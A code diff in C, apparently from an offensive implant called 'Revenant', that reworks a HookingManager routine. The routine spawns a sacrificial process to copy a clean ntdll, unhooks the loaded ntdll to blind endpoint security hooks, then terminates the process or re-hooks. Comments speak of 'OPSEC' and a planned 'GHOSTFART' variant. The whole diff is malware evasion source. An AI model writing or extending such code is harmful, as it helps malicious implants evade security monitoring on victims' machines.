@@ -589,14 +589,15 @@ LEAVE:
 }
 
 // True if Unhooking, False if Rehooking
-VOID HookingManager(BOOL UnHook, LPVOID pCache, HMODULE p_ntdll, SIZE_T ntdll_size){
+VOID HookingManager(INT UnHook, LPVOID pCache, HMODULE p_ntdll, SIZE_T ntdll_size){
 // TODO IMPLEMENT GHOSTFART INSTEAD OF PERUN'S FART & MORE OPSEC HERE
 
 #if CONFIG_UNHOOK == TRUE
 
     SIZE_T bytesRead = 0;
 
-    if(UnHook){
+    if(UnHook == 0){
+        // Get clean copy of ntdll
         STARTUPINFOA si = { 0 };
         PROCESS_INFORMATION pi = { 0 };
 
@@ -611,11 +612,18 @@ VOID HookingManager(BOOL UnHook, LPVOID pCache, HMODULE p_ntdll, SIZE_T ntdll_si
         UnHookNtdll(p_ntdll, pCache);
 
         LEAVE:
-        // Kill sacrificial process
-        TerminateProcess(pi.hProcess, 0);
+            // Kill sacrificial process
+            if(pi.hProcess != NULL){
+                TerminateProcess(pi.hProcess, 0);
+            }
 
 
+
+    }else if (UnHook == 1){
+        // check if we already got a clean copy in memory
+        UnHookNtdll(p_ntdll, pCache);
     }else{
+        // rehook Revenant
         ReHookNtdll(p_ntdll, pCache);
     }
 
